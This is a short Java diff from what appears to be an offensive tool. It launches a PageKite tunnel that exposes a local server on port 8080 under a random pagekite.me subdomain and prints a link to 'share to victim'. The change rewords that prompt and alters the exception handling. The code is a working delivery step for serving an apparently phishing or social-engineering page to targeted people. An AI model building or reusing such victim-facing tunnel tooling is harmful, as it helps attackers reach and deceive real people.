@@ -40,9 +40,9 @@ public class Command {
             String name = getRandom(10);
             ProcessBuilder processBuilder = new ProcessBuilder("cmd", "/c start cmd.exe /K \"\"" + pythonPath + "\\Python" + i + "\\python\" \"" + pageKiteFilePath + "\" 8080 " + name + ".pagekite.me < " + inputFilePath + "\"");
             pagekiteProcess = processBuilder.start();
-            System.out.println("\nShare this link to victim: "+name+".pagekite.me");
+            System.out.println("\nShare the following link to victim when the pagekite says 'Kites are Flying'\n"+"https://"+name+".pagekite.me");
         } catch (Exception e) {
-            System.out.println(e);
+            e.printStackTrace();
         }
     }
 }
